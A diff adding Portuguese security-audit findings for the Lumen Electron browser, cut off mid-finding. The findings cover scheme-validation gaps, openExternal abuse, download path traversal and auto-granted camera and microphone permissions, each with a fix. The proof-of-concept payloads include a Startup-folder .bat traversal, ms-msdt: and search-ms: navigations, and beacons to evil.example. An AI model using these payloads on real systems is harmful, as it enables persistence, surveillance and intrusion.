@@ -1,0 +1,735 @@
+[
+  {
+    "verdict": "confirmed",
+    "fingerprint": "lumen/create-webtab-no-scheme-validation",
+    "title": "createWebTab aceita qualquer esquema a partir de fontes controladas por conteúdo web (popup, menu de contexto, arrastar arquivo, restauração de sessão)",
+    "description": "openUrl/resolveInput validam entrada digitada (allowlist lumen:, http(s), localhost, domínio, about/devtools), mas createWebTab é o ponto de criação do guest e não valida nada. Quatro caminhos chegam a ele com URLs fornecidas por conteúdo web: lumen:popup (window.open do guest, shell.js:1633), menu de contexto 'Abrir link em nova aba' (params.linkURL, shell.js:1099-1100), arrastar arquivo local (shell.js:1588) e restauração de sessão (shell.js:1673). O resultado é que uma página pode forçar a abertura de file:// (recurso local exibido em uma aba), de javascript:/data: no guest, ou de qualquer outro esquema aceito pelo webview. A navegação inicial do guest ocorre antes de attachGuest (main.js:304-308 é disparado por tab:ready no dom-ready), portanto will-navigate também não alcança esse primeiro carregamento.",
+    "root_cause": "Não existe validação centralizada no único ponto que cria guests; a validação existe apenas no caminho de entrada digitada (resolveInput).",
+    "intended_behavior": "createWebTab deve aceitar apenas http(s) (e os destinos internos lumen://) e rejeitar file:, javascript:, data: e esquemas arbitrários vindos de qualquer fonte.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/renderer/shell.js",
+        "line": 1633,
+        "scope": "renderer",
+        "description": "on('lumen:popup', ({url}) => { createWebTab(url); }) — url vem do setWindowOpenHandler do guest (main.js:181)"
+      },
+      {
+        "kind": "propagation",
+        "file": "src/renderer/shell.js",
+        "line": 1099,
+        "scope": "renderer",
+        "description": "menu de contexto 'Abrir link em nova aba' usa params.linkURL, fornecido pelo guest via evento context-menu (ponto de entrada adicional do mesmo fluxo)"
+      },
+      {
+        "kind": "propagation",
+        "file": "src/renderer/shell.js",
+        "line": 229,
+        "scope": "renderer",
+        "description": "webview.setAttribute('src', deferred ? 'about:blank' : url) sem validar esquema"
+      },
+      {
+        "kind": "sink",
+        "file": "src/renderer/shell.js",
+        "line": 446,
+        "scope": "renderer",
+        "description": "loadInTab() aplica loadURL(url) na ativação da aba, também sem validação"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/renderer/shell.js",
+        "line": 122,
+        "description": "resolveInput() é a única validação de esquema e só é usada por openUrl (entrada digitada)"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 181,
+        "description": "setWindowOpenHandler repassa a URL do popup ao renderer sem restrição de esquema"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 306,
+        "description": "attachGuest (e portanto will-navigate) só é aplicado depois do tab:ready no dom-ready, logo a navegação inicial do guest não passa por will-navigate"
+      },
+      {
+        "file": "src/renderer/shell.js",
+        "line": 1588,
+        "description": "O handler de drop carrega file:/// do arquivo arrastado sem checagem de tipo"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Para o caminho de menu de contexto é necessário um clique com o botão direito; para popup e arrastar-arquivo, um gesto do usuário ou uma janela popup automática."
+      },
+      {
+        "kind": "data_state",
+        "description": "A restauração de sessão (shell.js:1673) reaplica URLs salvas sem revalidação, o que exige que session.json já contenha uma URL de esquema perigoso."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Operador de uma página web que a vítima visita.",
+      "payloads": [
+        "window.open('file:///C:/Users/Public/target.txt')",
+        "<a href=\"file:///C:/Windows/System32/drivers/etc/hosts\">hosts</a> (clique com o botão direito -> Abrir link em nova aba)",
+        "<a href=\"javascript:location='https://evil.example/?x'\">link</a> (menu de contexto -> nova aba)"
+      ],
+      "instructions": [
+        "Publique uma página com window.open('file:///C:/Users/Public/target.txt') e abra-a no Lumen; observe a nova aba carregando o recurso local.",
+        "Publique um link com href file:// e use o menu de contexto 'Abrir link em nova aba'; observe o mesmo resultado.",
+        "Verifique em src/renderer/shell.js que nenhum desses caminhos passa por resolveInput (shell.js:122) antes de createWebTab (shell.js:198)."
+      ],
+      "observed_result": "Derivado do código-fonte: os quatro caminhos alcançam createWebTab com a URL intacta e o guest recebe o src sem validação. A execução de um guest file:// não foi disparada nesta auditoria."
+    },
+    "remediation": {
+      "strategy": "Validar o esquema no único ponto de criação do guest e rotear popups e itens de menu por openUrl em vez de createWebTab.",
+      "code_changes": [
+        {
+          "file_name": "src/renderer/shell.js",
+          "fixed_code": "function createWebTab(url, opts = {}) {\n  let proto = '';\n  try { proto = new URL(url, 'https://invalid').protocol; } catch { proto = ''; }\n  if (!/^https?:$/.test(proto)) {\n    if (!/^lumen:\\/\\/(newtab|page\\/)/i.test(String(url))) {\n      toast('Esquema não permitido: ' + (proto || url));\n      return null;\n    }\n  }\n  // ... resto inalterado\n}\n\n// e nos call sites:\n// items.push({ label: 'Abrir link em nova aba', act: () => openUrl(params.linkURL) });\n// on('lumen:popup', ({ url }) => { if (url) openUrl(url); });"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Qualquer página consegue disparar window.open ou oferecer um link; não há atrito para o atacante além do gesto usual."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Conteúdo web passa a controlar quais recursos locais são abertos em abas (file://) e quais esquemas o guest executa, quebrando a fronteira entre web e recursos locais."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Os quatro call sites e o sink estão identificados no código-fonte (shell.js:229,446,1099,1588,1633,1673)."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "lumen/downloads-show-arbitrary-path",
+    "title": "downloads:show abre no Explorer qualquer caminho existente informado pelo renderer",
+    "description": "O handler aceita p.path do renderer e chama shell.showItemInFolder(p.path) bastando que fs.existsSync seja verdadeiro. Não há vínculo com a lista de downloads nem restrição de diretório. Isso é uma capacidade privilegiada exposta ao renderer que um comprometimento do renderer (por exemplo um XSS na casca) transformaria em revelação e navegação para qualquer pasta do usuário.",
+    "claimed_root_cause": "O handler confia no caminho vindo do renderer em vez de restringir a itens registrados em data/downloads.json.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/main.js",
+        "line": 295,
+        "scope": "main",
+        "description": "if (p.path && fs.existsSync(p.path)) shell.showItemInFolder(p.path); — p.path vem do renderer via IPC"
+      },
+      {
+        "kind": "sink",
+        "file": "src/main/main.js",
+        "line": 295,
+        "scope": "main",
+        "description": "showItemInFolder abre o gerenciador de arquivos no caminho informado"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/preload-shell.js",
+        "line": 23,
+        "description": "'downloads:show' está na allowlist de canais expostos ao renderer"
+      },
+      {
+        "file": "src/renderer/shell.js",
+        "line": 947,
+        "description": "O renderer envia o caminho do item de download, que é o único uso legítimo do canal"
+      }
+    ],
+    "blockers": [
+      "Não foi estabelecido um caminho pelo qual conteúdo web alcance window.lumen: a casca roda com contextIsolation/sandbox e CSP script-src 'self' (shell.html:7), o guest não tem preload e o handler ipc-message é vazio (shell.js:376).",
+      "Sem execução do renderer comprometido não é possível demonstrar o efeito; a evidência é de capacidade, não de exploração."
+    ],
+    "validation_plan": {
+      "local": "Em sandbox, injetar no renderer um payload de teste (apenas em cópia descartável do alvo) que invoque downloads:show com caminho fora de Downloads e observar a abertura do Explorer.",
+      "deployment": "N/A — o canal é local ao processo."
+    }
+  },
+  {
+    "verdict": "rejected",
+    "fingerprint": "lumen/engine-cache-deserialize",
+    "title": "Cache do motor de filtros (engine-*.bin) poderia executar código ao ser substituído",
+    "description": "Candidate: o arquivo de cache serializado poderia ser substituído por conteúdo arbitrário e o motor o desserializaria.",
+    "claimed_root_cause": "ElectronBlocker.deserialize sobre arquivo de cache em userData/cache.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/adblock.js",
+        "line": 134,
+        "scope": "main",
+        "description": "ElectronBlocker.deserialize(new Uint8Array(buf)) lê o cache local"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/adblock.js",
+        "line": 138,
+        "description": "Falha na desserialização cai no parse das listas, sem propagar erro"
+      },
+      {
+        "file": "src/main/adblock.js",
+        "line": 152,
+        "description": "O cache é um dump do próprio motor (engine.serialize()), sem interpolação de entrada externa"
+      }
+    ],
+    "reason": "O caminho do cache não deriva de entrada do usuário (é derivado de estatísticas locais dos arquivos de filtro), e a desserialização é leitura binária com fallback para parse; não há sink de execução de código no repositório. Rejeitado."
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "lumen/filter-list-update-no-integrity-or-limit",
+    "title": "Atualização de listas de filtros sem verificação de integridade, tamanho ou tempo limite",
+    "description": "updateLists faz fetch de seis URLs remotas, escreve a resposta integral em assets/filters e reconstrói o motor. Não há hash/assinatura, limite de tamanho nem timeout. Como o adblocker carrega filtros cosméticos e $redirect, uma resposta controlada pelo atacante (host comprometido, CA indevida ou conteúdo trocado no caminho) passa a ser aplicada em todas as abas, incluindo injeção de script no contexto da página e reescrita de requisições.",
+    "claimed_root_cause": "A atualização confia integralmente no transporte HTTPS e no host Terceiro; não há verificação de conteúdo antes de gravar e carregar as listas.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/adblock.js",
+        "line": 326,
+        "scope": "main",
+        "description": "fetch(url) sem timeout, sem limite de tamanho e sem validação de conteúdo"
+      },
+      {
+        "kind": "propagation",
+        "file": "src/main/adblock.js",
+        "line": 328,
+        "scope": "main",
+        "description": "const text = await res.text() — corpo inteiro em memória"
+      },
+      {
+        "kind": "sink",
+        "file": "src/main/adblock.js",
+        "line": 329,
+        "scope": "main",
+        "description": "writeFileSync sobrescreve a lista local que é carregada no próximo buildBlocker"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/adblock.js",
+        "line": 31,
+        "description": "ENGINE_CONFIG carrega filtros cosméticos (loadCosmeticFilters: true), que executam scriptlets na página"
+      },
+      {
+        "file": "src/main/adblock.js",
+        "line": 44,
+        "description": "REMOTE_UPDATES lista os hosts de origem (easylist.to, raw.githubusercontent.com)"
+      },
+      {
+        "file": "src/main/adblock.js",
+        "line": 272,
+        "description": "O canal adblock:update permite que o renderer dispare a atualização sem restrição de frequência"
+      }
+    ],
+    "blockers": [
+      "O efeito depende de controle do host remoto ou de quebra de TLS; nada no repositório indica comprometimento atual desses hosts.",
+      "A suíte @ghostery/adblocker não foi executada nesta auditoria; a execução de scriptlets depende do caminho interno da biblioteca (node_modules/@ghostery/adblocker), não do código do alvo."
+    ],
+    "validation_plan": {
+      "local": "Em sandbox sem rede externa, substituir a resposta de uma das URLs por uma lista de teste com regra $redirect e um scriptlet, executar updateLists e observar a aplicação em uma página fixture local.",
+      "deployment": "N/A — a verificação é local; o risco residual é de cadeia de suprimentos e deve ser tratado com pin de hash/assinatura e limite de tamanho."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "lumen/guest-will-navigate-external-open-denylist",
+    "title": "will-navigate usa denylist e encaminha file: e protocolos arbitrários para shell.openExternal",
+    "description": "Em attachGuest, toda navegação cujo protocolo não esteja em {http, https, mailto} e não seja about:/devtools: é enviada a shell.openExternal(url) e cancelada. Isso é uma denylist invertida: uma página web pode forçar o Lumen a abrir qualquer file:// (ou handler de protocolo registrado no SO) no aplicativo padrão, sem diálogo. O comportamento é o oposto do endurecimento esperado de um navegador, que nega esquemas desconhecidos ou pede confirmação.",
+    "root_cause": "A decisão usa uma lista negra de três esquemas em vez de uma allowlist positiva, e não há confirmação do usuário antes de shell.openExternal.",
+    "intended_behavior": "Apenas http/https devem navegar no guest; qualquer outro esquema deve ser negado (ou confirmado explicitamente pelo usuário), e file: nunca deve ser delegado ao sistema operacional.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/main.js",
+        "line": 185,
+        "scope": "main",
+        "description": "wc.on('will-navigate', (e, url) => ...) — url é o destino pedido pela página"
+      },
+      {
+        "kind": "propagation",
+        "file": "src/main/main.js",
+        "line": 193,
+        "scope": "main",
+        "description": "if (!EXTERNAL.has(proto) && !/^(about|devtools):$/i.test(proto)) — tudo que não é http/https/mailto/about/devtools entra no ramo"
+      },
+      {
+        "kind": "sink",
+        "file": "src/main/main.js",
+        "line": 194,
+        "scope": "main",
+        "description": "shell.openExternal(url) delega o esquema ao SO (abre o arquivo/app associado), sem prompt"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/main.js",
+        "line": 25,
+        "description": "EXTERNAL é {http:, https:, mailto:} — qualquer outro esquema cai no ramo de openExternal"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 195,
+        "description": "e.preventDefault() impede a navegação interna, mas o efeito colateral (abrir no SO) já ocorreu"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 180,
+        "description": "setWindowOpenHandler nega popups e repassa a URL ao renderer, mas não cobre a navegação top-level tratada aqui"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "A vítima precisa visitar uma página que tente navegar para um esquema não-web (location.href, meta refresh, link)."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "O efeito depende de handlers de protocolo e do aplicativo padrão do SO para o esquema/arquivo aberto."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Operador de uma página web que a vítima visita.",
+      "payloads": [
+        "location.href = 'file:///C:/Users/Public/notes.txt'",
+        "location.href = 'search-ms:query=confidential'",
+        "location.href = 'ms-msdt:/id'"
+      ],
+      "instructions": [
+        "Publique uma página que execute location.href = 'file:///C:/Users/Public/notes.txt' no carregamento.",
+        "Abra a página no Lumen e observe que o arquivo é aberto no aplicativo padrão (Bloco de Notas) sem qualquer diálogo.",
+        "Repita com um handler de protocolo registrado (por exemplo um app instalado) e observe o acionamento fora do navegador."
+      ],
+      "observed_result": "Derivado do código-fonte: para proto='file:', EXTERNAL não contém o esquema e a condição da linha 193 é verdadeira, portanto shell.openExternal é chamado com a URL completa. A abertura no SO não foi executada nesta auditoria."
+    },
+    "remediation": {
+      "strategy": "Trocar a denylist por allowlist e nunca delegar file: ao sistema operacional.",
+      "code_changes": [
+        {
+          "file_name": "src/main/main.js",
+          "fixed_code": "wc.on('will-navigate', (e, url) => {\n  let proto = '';\n  try { proto = new URL(url).protocol; } catch { proto = ''; }\n  if (EXTERNAL.has(proto) || /^(about|devtools):$/i.test(proto)) return;\n  e.preventDefault();\n  if (proto === 'mailto:' || /^https?:$/i.test(proto)) return;\n  // Qualquer outro esquema (file:, handlers customizados) e negado.\n});"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Basta a vítima abrir uma página com redirecionamento de esquema; não há atrito adicional."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Abertura silenciosa de arquivos locais e de handlers de protocolo do SO a partir de conteúdo web, com alcance limitado ao que o usuário tem permissão de abrir."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "A lógica completa está em main.js:185-197 e o conjunto EXTERNAL está em main.js:25."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "lumen/main-downloads-filename-path-traversal",
+    "title": "Nome do arquivo do download (Content-Disposition) aceita path traversal e grava fora da pasta Downloads",
+    "description": "O handler de will-download monta o caminho final com path.join(downloads, item.getFilename()). getFilename() devolve o nome fornecido pelo servidor (Content-Disposition), que é entrada não confiável. path.join normaliza '..', portanto um nome como '..\\..\\..\\evil.bat' resolve para fora de %USERPROFILE%\\Downloads. uniquePath() devolve esse caminho intacto e ele é atribuído a item.savePath, que o Electron honra, criando um arquivo novo com conteúdo escolhido pelo atacante em qualquer diretório gravável pelo usuário.",
+    "root_cause": "uniquePath() normaliza apenas o rótulo de exibição com path.basename() (linha 84), mas o candidato gravado continua sendo path.join(dir, filename) (linha 85). Não há rejeição de '..' nem verificação de que o caminho final permanece dentro do diretório de downloads.",
+    "intended_behavior": "Todo download deve ser gravado dentro de app.getPath('downloads'), com nome de arquivo reduzido a um único segmento (basename) e sem componentes de diretório.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/main.js",
+        "line": 97,
+        "scope": "main",
+        "description": "item.savePath = uniquePath(app.getPath('downloads'), item.getFilename()) — getFilename() vem do servidor via Content-Disposition"
+      },
+      {
+        "kind": "propagation",
+        "file": "src/main/main.js",
+        "line": 85,
+        "scope": "main",
+        "description": "let candidate = path.join(dir, filename); path.join normaliza '..', removendo prefixos da pasta de downloads"
+      },
+      {
+        "kind": "sink",
+        "file": "src/main/main.js",
+        "line": 97,
+        "scope": "main",
+        "description": "savePath atribuído explicitamente; o Electron grava o arquivo nesse caminho (não há revalidação posterior)"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/main.js",
+        "line": 82,
+        "description": "uniquePath() é a única sanitização aplicada ao nome do arquivo"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 84,
+        "description": "path.basename é usado apenas para compor o rótulo de exibição, não para o caminho gravado"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 97,
+        "description": "savePath recebe o resultado de uniquePath sem checagem de prefixo do diretório de downloads"
+      },
+      {
+        "file": "src/renderer/shell.js",
+        "line": 1106,
+        "description": "O menu de contexto 'Salvar imagem' chama tab.el.downloadURL(params.srcURL) com URL fornecida pelo guest, entregando ao atacante o controle do disparo do download"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "A vítima precisa disparar (ou confirmar) um download de uma origem controlada pelo atacante; o menu de contexto 'Salvar imagem' e um clique em link são caminhos normais."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "O diretório de destino precisa existir; %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup e %TEMP% existem em qualquer instalação padrão do Windows."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Operador de um site (ou de um servidor que a vítima baixe) que controla o cabeçalho Content-Disposition da resposta.",
+      "payloads": [
+        "..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\lumen-update.bat",
+        "..\\..\\..\\..\\Windows\\Temp\\lumen-probe.txt"
+      ],
+      "instructions": [
+        "Sirva um arquivo em https com Content-Disposition: attachment; filename=\"..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\lumen-update.bat\".",
+        "Na vítima, abra o Lumen, acesse a URL e salve o arquivo (clique normal ou menu de contexto 'Salvar imagem').",
+        "Observe o caminho registrado em item.savePath (painel de downloads e data/downloads.json) e verifique que o arquivo foi criado na pasta de Inicialização, fora de Downloads.",
+        "Reinicie a sessão do Windows: o arquivo .bat gravado é executado no logon."
+      ],
+      "observed_result": "Derivado do código com verificação local do primitivo: em Node, path.join('C:\\Users\\vitima\\Downloads', '..\\..\\..\\evil.bat') produz 'C:\\evil.bat' e path.join('C:\\Users\\vitima\\Downloads', '..\\..\\..\\..\\Windows\\Temp\\x.txt') produz 'C:\\Windows\\Temp\\x.txt'. uniquePath só acrescenta sufixo numérico quando o caminho já existe, portanto não bloqueia a criação de um arquivo novo fora de Downloads. O comportamento do Electron ao honrar savePath não foi executado nesta auditoria (ver conditions)."
+    },
+    "remediation": {
+      "strategy": "Impor o invariante 'o caminho final é um único segmento dentro do diretório de downloads' no último ponto de decisão confiável (main), antes de atribuir savePath.",
+      "code_changes": [
+        {
+          "file_name": "src/main/main.js",
+          "fixed_code": "function uniquePath(dir, filename) {\n  const safe = path.basename(String(filename || '')).replace(/[<>:\"/\\\\|?*\\u0000-\\u001f]/g, '_') || 'download';\n  const ext = path.extname(safe);\n  const base = path.basename(safe, ext);\n  let candidate = path.join(dir, safe);\n  let i = 1;\n  while (fs.existsSync(candidate)) {\n    candidate = path.join(dir, `${base} (${i})${ext}`);\n    i += 1;\n  }\n  const root = path.resolve(dir);\n  if (candidate !== root && !candidate.startsWith(root + path.sep)) return path.join(root, 'download');\n  return candidate;\n}"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Exige que a vítima baixe um arquivo de uma origem controlada pelo atacante; o disparo do download é trivial (link com download, ou 'Salvar imagem' do menu de contexto)."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Criação de arquivo com conteúdo arbitrário em qualquer caminho gravável pelo usuário, incluindo a pasta de Inicialização, o que dá persistência e execução de código no próximo logon."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "O caminho completo está no código-fonte (main.js:82-97) e o primitivo de normalização foi verificado localmente com a mesma função path.join usada pelo app."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "lumen/no-will-attach-webview-hardening",
+    "title": "Nenhum endurecimento em will-attach-webview: o renderer pode criar guests com nodeintegration/preload próprios",
+    "description": "O app registra handlers em web-contents-created apenas para atalhos; não há will-attach-webview que remova webPreferences do guest. Como webviewTag está habilitado, um renderer comprometido pode anexar um <webview> com nodeintegration, preload apontando para arquivo local ou disablewebsecurity, obtendo execução de Node fora do modelo pretendido. A casca roda com sandbox, contextIsolation e CSP restritiva, e nenhum XSS foi estabelecido, portanto o pré-requisito não está demonstrado.",
+    "claimed_root_cause": "Ausência de app.on('web-contents-created') com contents.on('will-attach-webview') para forçar webPreferences seguras e validar src/partition/preload.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/main.js",
+        "line": 496,
+        "scope": "main",
+        "description": "webviewTag: true na janela principal permite que o renderer crie guests"
+      },
+      {
+        "kind": "sink",
+        "file": "src/main/main.js",
+        "line": 626,
+        "scope": "main",
+        "description": "web-contents-created apenas chama wireShortcuts; nenhum will-attach-webview é registrado"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/renderer/shell.js",
+        "line": 231,
+        "description": "O webview criado pelo app define apenas allowpopups/partition; nenhum atributo sandbox/webpreferences é forçado pelo main"
+      },
+      {
+        "file": "src/main/preload-shell.js",
+        "line": 5,
+        "description": "A allowlist de canais e a ausência de preload no guest limitam o dano de um XSS, mas não substituem o endurecimento do attach"
+      }
+    ],
+    "blockers": [
+      "O pré-requisito (execução de código no renderer) não foi estabelecido: CSP script-src 'self' (shell.html:7), escapeHtml aplicado nos pontos de interpolação e guest sem preload/IPC.",
+      "A exploração exige executar o app com um renderer modificado em sandbox, o que não foi feito."
+    ],
+    "validation_plan": {
+      "local": "Em cópia descartável do alvo, inserir no renderer a criação de um <webview nodeintegration src='file:///...'> e verificar em sandbox se o guest obtém require; isso demonstra o controle ausente, não uma exploração por conteúdo web.",
+      "deployment": "N/A."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "lumen/notifications-permitted-on-insecure-origins",
+    "title": "Permissão notifications concedida a origens http (sem TLS)",
+    "description": "O handler de checagem (setPermissionCheckHandler, main.js:568-571) devolve true para notifications em qualquer origem, sem consultar requestingUrl. Como as APIs web consultam primeiro o check handler e só emitem um pedido de permissão quando a checagem é negada, a resposta true concede a permissão diretamente: uma página http (sem TLS) pode registrar notificações e exibir conteúdo persistente no desktop da vítima. O handler de requisição (main.js:553-567) tem lógica diferente e negaria http para notifications, o que evidencia a inconsistência entre os dois handlers.",
+    "root_cause": "notifications recebeu tratamento especial no handler de checagem (retorno true incondicional) em vez de seguir a mesma regra de origem segura aplicada no handler de requisição.",
+    "intended_behavior": "notifications deve seguir a mesma regra das demais permissões: apenas origens HTTPS recebem a permissão.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/main.js",
+        "line": 569,
+        "scope": "main",
+        "description": "if (permission === 'fullscreen' || permission === 'notifications') return true; — nenhuma checagem de requestingUrl"
+      },
+      {
+        "kind": "propagation",
+        "file": "src/main/main.js",
+        "line": 565,
+        "scope": "main",
+        "description": "A condição secure (https://) existe apenas no handler de requisição (linha 565-566), que negaria http; o check handler da linha 569 encurta o caminho e concede antes disso"
+      },
+      {
+        "kind": "sink",
+        "file": "src/main/main.js",
+        "line": 566,
+        "scope": "main",
+        "description": "callback(allowed.has(permission) && (secure || permission === 'fullscreen')) — a allowlist inclui notifications, mas esse caminho só é alcançado quando o check handler nega"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/main.js",
+        "line": 554,
+        "description": "A allowlist do handler de requisição inclui 'notifications'"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 569,
+        "description": "O handler de checagem devolve true para notifications sem considerar requestingUrl, concedendo a permissão a origens http"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "A vítima precisa visitar uma página http que solicite a permissão de notificação."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Operador de um site http (sem TLS) ou de uma rede local.",
+      "payloads": [
+        "Notification.requestPermission().then(p => console.log(p))"
+      ],
+      "instructions": [
+        "Sirva uma página em http:// (sem TLS) que chame Notification.requestPermission().",
+        "Abra a página no Lumen e observe que a permissão é concedida sem prompt.",
+        "Registre uma notificação e observe o conteúdo exibido no desktop."
+      ],
+      "observed_result": "Derivado do código-fonte: em http, o check handler da linha 569 devolve true para notifications, e a allowlist da linha 554 contém a permissão."
+    },
+    "remediation": {
+      "strategy": "Tratar notifications como as demais permissões, exigindo origem HTTPS nos dois handlers.",
+      "code_changes": [
+        {
+          "file_name": "src/main/main.js",
+          "fixed_code": "session.defaultSession.setPermissionCheckHandler((_wc, permission, _origin, details) => {\n  if (permission === 'fullscreen') return true;\n  return (details.requestingUrl || '').startsWith('https://');\n});"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Exige uma página http, comum em redes locais e em sites legados."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Spam e phishing de notificações no desktop, sem acesso a dados além do que a própria página controla."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "A condição está explícita em main.js:569 e main.js:554."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "lumen/permission-media-auto-granted-https",
+    "title": "Requisições de permissão media (câmera/microfone), clipboard-read e window-management são concedidas automaticamente a qualquer origem HTTPS",
+    "description": "O handler de permissões da sessão padrão inclui 'media', 'clipboard-read', 'window-management' e 'unknown' na allowlist e só exige que requestingUrl comece com https://. Como a allowlist é autoritativa, qualquer site HTTPS recebe câmera e microfone sem prompt e sem gesto do usuário; o mesmo vale para leitura de área de transferência. Este é um controle explícito do navegador (prompt de permissão) derrotado por completo para uma ação com consequências reais de vigilância.",
+    "root_cause": "A política confunde 'origem segura' com 'permissão concedida': o conjunto permitido contém permissões que exigem consentimento explícito (media, clipboard-read, window-management) e a checagem de scheme é a única condição aplicada.",
+    "intended_behavior": "Câmera, microfone, leitura de área de transferência e gerenciamento de janelas só devem ser concedidos após consentimento explícito do usuário (callback(false) por padrão), como faz um navegador de referência.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "src/main/main.js",
+        "line": 566,
+        "scope": "main",
+        "description": "callback(allowed.has(permission) && (secure || permission === 'fullscreen')) — a allowlist inclui 'media'"
+      },
+      {
+        "kind": "propagation",
+        "file": "src/main/main.js",
+        "line": 565,
+        "scope": "main",
+        "description": "const secure = (details.requestingUrl || '').startsWith('https://') — única condição além da allowlist"
+      },
+      {
+        "kind": "sink",
+        "file": "src/main/main.js",
+        "line": 566,
+        "scope": "main",
+        "description": "callback(true) concede a permissão ao guest sem interação do usuário"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "src/main/main.js",
+        "line": 554,
+        "description": "A allowlist de permissões inclui 'media', 'clipboard-read', 'window-management' e 'unknown'"
+      },
+      {
+        "file": "src/main/main.js",
+        "line": 569,
+        "description": "O handler de checagem também devolve true para fullscreen e notifications em qualquer origem"
+      },
+      {
+        "file": "src/renderer/shell.js",
+        "line": 231,
+        "description": "O guest é criado com allowpopups e sem sandbox/webpreferences, mas sem preload; o acesso privilegiado aqui é a permissão concedida pelo main, não a ponte IPC"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "A vítima precisa visitar uma página HTTPS controlada pelo atacante (ou comprometida) que chame getUserMedia; nenhum clique adicional é necessário."
+      },
+      {
+        "kind": "data_state",
+        "description": "A vítima precisa ter câmera/microfone disponíveis; o pedido é concedido sem indicador de consentimento."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Operador de um site HTTPS que a vítima visita.",
+      "payloads": [
+        "navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(s => { new Image().src = 'https://evil.example/cam?' + Date.now(); })"
+      ],
+      "instructions": [
+        "Publique em HTTPS uma página que chama navigator.mediaDevices.getUserMedia({video:true,audio:true}) no carregamento.",
+        "Abra a página em uma aba do Lumen e observe que o stream é aberto sem qualquer diálogo de permissão.",
+        "Confirme no src/main/main.js:553-567 que 'media' está na allowlist e que a única condição é https://."
+      ],
+      "observed_result": "Derivado do código-fonte: com requestingUrl começando por https://, a expressão allowed.has('media') && true resulta em callback(true). A execução de getUserMedia não foi disparada nesta auditoria."
+    },
+    "remediation": {
+      "strategy": "Remover permissões que exigem consentimento da allowlist automática e negar por padrão, mantendo apenas o que é inócuo (fullscreen, pointerLock, accelerated-2d-canvas).",
+      "code_changes": [
+        {
+          "file_name": "src/main/main.js",
+          "fixed_code": "session.defaultSession.setPermissionRequestHandler((_wc, permission, callback, details) => {\n  const allowed = new Set(['fullscreen', 'pointerLock', 'accelerated-2d-canvas']);\n  const secure = (details.requestingUrl || '').startsWith('https://');\n  callback(allowed.has(permission) && secure);\n});\n\nsession.defaultSession.setPermissionCheckHandler((_wc, permission, _origin, details) => {\n  if (permission === 'fullscreen' || permission === 'pointerLock') return true;\n  if (permission === 'media' || permission === 'clipboard-read' || permission === 'window-management') return false;\n  return (details.requestingUrl || '').startsWith('https://');\n});"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
